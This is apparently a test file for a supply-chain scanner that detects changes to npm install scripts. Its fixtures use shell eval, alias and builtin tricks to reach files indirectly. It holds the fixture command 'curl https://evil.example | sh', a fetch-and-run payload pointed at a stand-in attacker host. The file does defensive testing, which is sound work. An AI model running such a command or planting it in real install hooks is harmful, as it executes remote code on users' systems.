import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const shE = (body: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": "N=ok\n" + body + "./tools/$N.sh\n",
  "tools/ok.sh": "true\n",
  "docs/env": "N=../docs/run\n",
  "docs/run.sh": "true\n",
  "README.md": "a\n",
});

// Any eval word clears safe names, in any position. Quotes are not part of the word.
const cases: [string, string][] = [
  ["U1 sh command eval", "command eval 'true;. ./docs/env'\n"],
  ["U2 sh builtin eval", "builtin eval 'true;. ./docs/env'\n"],
  ["U3 sh then eval", "if true; then eval 'true;. ./docs/env'; fi\n"],
  ["U4 sh { eval; }", "{ eval 'true;. ./docs/env'; }\n"],
  ["U5 sh ! eval", "! eval 'true;. ./docs/env'\n"],
  ["U6 sh time eval", "time eval 'true;. ./docs/env'\n"],
  ["U7 sh eval single-quoted $D", "D=.; eval '$D ./docs/env'\n"],
  ["U8 sh eval mixed quotes", "eval \"true;\"'. ./docs/env'\n"],
  ["U9 sh eval split args", "eval 'true;.' ./docs/env\n"],
  ["U10 sh case arm eval", "case x in x) eval 'true;. ./docs/env';; esac\n"],
  ["U11 sh do eval", "while true; do eval 'true;. ./docs/env'; break; done\n"],
  ["U12 sh alias dot", "alias s=.\ns ./docs/env\n"],
];

for (const [name, body] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    const base = shE(body);
    holds(base, "docs/run.sh", sh);
    expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
  });
}
